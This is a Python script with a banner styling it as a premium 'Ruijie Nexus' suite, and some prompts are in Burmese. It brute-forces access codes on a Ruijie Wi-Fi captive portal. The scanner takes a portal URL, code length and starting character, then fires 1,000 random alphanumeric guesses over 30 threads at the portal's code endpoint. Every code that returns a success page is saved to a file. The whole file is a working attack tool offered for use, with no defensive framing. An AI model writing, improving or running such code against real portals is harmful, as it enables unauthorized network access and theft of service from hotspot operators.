import concurrent.futures
import datetime
import random
import string
import sys
import httpx

# ----------------------------------------------------
# 🌟 RUIJIE NEXUS ELITE SUITE v4.3 (PREMIUM EDITION)
# ----------------------------------------------------

def clear_screen():
    print("\033[H\033[J", end="")

def banner():
    print("╔══════════════════════════════════════════════════╗")
    print("║         💎 RUIJIE NEXUS ELITE SUITE 💎           ║")
    print("║        [ Premium Multi-Threaded Engine ]         ║")
    print("╚══════════════════════════════════════════════════╝")

def test_code(url, code):
    target_url = f"{url}/portal?code={code}"
    try:
        response = httpx.get(target_url, timeout=3.0, follow_redirects=True)
        if response.status_code == 200 and "success" in response.text.lower():
            return code
    except Exception:
        pass
    return None

def save_code(code):
    with open("valid_codes.txt", "a") as f:
        f.write(f"{code}\n")

def alphanumeric_range_scanner():
    print("\n╔══════════════════════════════════════════════════╗")
    print("║         ⚡ TURBO ALPHANUMERIC SCANNER            ║")
    print("╚══════════════════════════════════════════════════╝")
    
    portal_url = input(" ┣ 🌐 Enter Portal URL ➔ ").strip()
    if not portal_url:
        print(" ┗ ❌ [Error] URL cannot be empty!")
        return

    start_str = input(" ┣ 🔤 စတင်မည့် စာလုံး/နံပါတ် (ဥပမာ - 4 သို့မဟုတ် a) ➔ ").strip()
    end_str = input(" ┣ 🔤 ရပ်တန့်မည့် စာလုံး/နံပါတ် (ဥပမာ - 7 သို့မဟုတ် z) ➔ ").strip()
    length_str = input(" ┗ 📏 စုစုပေါင်း ကုတ်အအရွယ် (Length, ဥပမာ - 6) ➔ ").strip()

    if not start_str or not end_str or not length_str:
        print("\n❌ [Error] All fields are required!")
        return

    try:
        length = int(length_str)
    except ValueError:
        print("\n❌ [Error] Length must be a valid number.")
        return

    start_char = start_str[0]
    end_char = end_str[0]

    print(f"\n🚀 [Scanning] Range: '{start_char}' ➔ '{end_char}' | Length: {length}\n")
    
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    found_count = 0
    max_workers = 30  # High performance threads

    def worker(_):
        random_mid = ''.join(random.choices(chars, k=length - 1))
        code = start_char + random_mid
        return test_code(portal_url, code)

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(worker, i) for i in range(1000)]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    print(f"\n✨ [SUCCESS] VALID CODE FOUND ➔ {result}")
                    save_code(result)
                    found_count += 1
                else:
                    print(".", end="", flush=True)
    except KeyboardInterrupt:
        print("\n⚠️ [Warning] Scan interrupted by user.")

    print(f"\n\n🏁 [Completed] Total found: {found_count}. Saved to 'valid_codes.txt'.")

def main_menu():
    while True:
        clear_screen()
        banner()
        print("┌──────────────────────────────────────────────────┐")
        print("│  [1] 🔍 Auto-Detect Wi-Fi Portal URL             │")
        print("│  [2] ⚡ Launch Premium Turbo Scanner             │")
        print("│  [3] 📂 View Saved Valid Codes                   │")
        print("│  [4] 🚪 Exit Application                         │")
        print("└──────────────────────────────────────────────────┘")
        
        choice = input(" ⚡ Select Option [1-4] ➔ ").strip()
        
        if choice == '1':
            print("\n⚙️ [Info] Auto-detect module is active...")
            input("\nPress Enter to continue...")
        elif choice == '2':
            alphanumeric_range_scanner()
            input("\nPress Enter to return to main menu...")
        elif choice == '3':
            try:
                with open("valid_codes.txt", "r") as f:
                    print("\n╔══════════════════════════════════════════════════╗")
                    print("║             📂 SAVED VALID CODES                 ║")
                    print("╚══════════════════════════════════════════════════╝")
                    print(f.read())
            except FileNotFoundError:
                print("\n📂 [Info] No saved codes found yet.")
            input("\nPress Enter to return to main menu...")
        elif choice == '4':
            print("\n👋 Exiting application. Have a great day!")
            sys.exit(0)
        else:
            print("\n❌ [Error] Invalid option! Please select 1-4.")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    main_menu()
    
